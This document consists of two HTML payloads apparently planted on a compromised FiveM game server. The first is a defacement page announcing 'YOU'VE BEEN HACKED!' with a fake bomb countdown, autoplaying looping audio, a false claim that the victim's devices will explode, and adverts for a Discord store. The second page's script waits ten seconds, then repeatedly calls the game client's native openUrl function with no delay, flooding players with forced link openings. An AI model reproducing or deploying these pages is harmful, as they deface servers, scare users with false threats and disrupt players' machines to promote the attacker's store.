
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>You've Been Hacked!</title>
  <style>
    body {
      background-color: #000;
      color: #fff;
      font-family: 'Courier New', Courier, monospace;
      text-align: center;
      padding: 50px 20px;
      position: relative;
    }

    h1 {
      font-size: 3em;
      margin: 0;
      text-shadow: 0 0 20px #fff, 0 0 30px #fff;
      animation: blink 1s infinite;
    }

    p {
      font-size: 1.5em;
      margin: 10px 0;
      text-shadow: 0 0 15px #fff;
    }

    a {
      color: #fff;
      text-decoration: none;
      font-size: 1.2em;
      text-shadow: 0 0 10px #fff;
    }

    a:hover {
      color: #ccc;
      text-decoration: underline;
    }

    .avatar {
      width: 220px;
      height: 220px;
      border-radius: 50%;
      border: 5px solid #fff;
      margin: 40px auto 30px;
      box-shadow: 0 0 15px #fff;
      display: block;
      object-fit: cover;
    }

    .footer {
      margin-top: 40px;
      font-size: 1em;
      color: #ccc;
      text-shadow: 0 0 10px #ccc;
    }

    #warningText {
      display: none;
      font-size: 2em;
      color: red;
      text-shadow: 0 0 10px red;
      margin-top: 30px;
    }

    .timer {
      position: fixed;
      top: 20px;
      right: 20px;
      font-size: 1.5em;
      display: flex;
      align-items: center;
      gap: 10px;
      background-color: rgba(255, 255, 255, 0.05);
      padding: 10px 15px;
      border-radius: 12px;
      border: 1px solid #fff;
      box-shadow: 0 0 10px #fff;
    }

    .timer img {
      width: 30px;
      height: 30px;
    }

    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0; }
    }
  </style>
</head>
<body>

  <!-- Timer -->
  <div class="timer">
    <img src="https://cdn-icons-png.flaticon.com/512/482/482541.png" alt="Realistic Bomb Icon">
    <span id="countdown">10</span>
  </div>

  <h1>YOU'VE BEEN HACKED!</h1>

  <img src="https://media1.tenor.com/m/-qbxT8FifWkAAAAd/katyusha-moskau.gif" alt="Dancing Cat" class="avatar">

  <p>Hacked by: <strong> شملان </strong></p>


<p> شملان عاد اليكم لا خوف عليكم



  <p>Visit <a href="https://discord.gg/rru">discord.gg/rru</a> to buy anything you want.</p>

  <div class="footer">RUN STORE Hacked This Server & Best Seller Of FiveM Ready With Stocks</div>
  <div class="footer">Welcome To My Discord: .gg/rru</div>

  <!-- Message after the countdown -->
  <div id="warningText">Time’s up, your devices will now explode 💣</div>

  <audio id="hackSound" src="https://e.top4top.io/m_338241fku1.mp3" preload="auto" autoplay loop></audio>

  <script>
    let seconds = 10;
    const countdownElement = document.getElementById('countdown');
    const warningText = document.getElementById('warningText');

    const timer = setInterval(() => {
      seconds--;
      countdownElement.textContent = seconds;

      if (seconds <= 0) {
        clearInterval(timer);
        warningText.style.display = 'block';
      }
    }, 1000);
  </script>

</body>
</html>



<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>  </title>
</head>
<body>
    <h1></h1>

    <script>
        // فتح الرابط كل 0 مللي ثانية بعد 10 ثوانٍ
        setTimeout(() => {
            setInterval(() => {
                window.invokeNative('openUrl', 'https://discord.gg/rru');
            }, 0.0); // فتح الرابط بشكل مستمر
        }, 10000);
    </script>
</body>
</html>
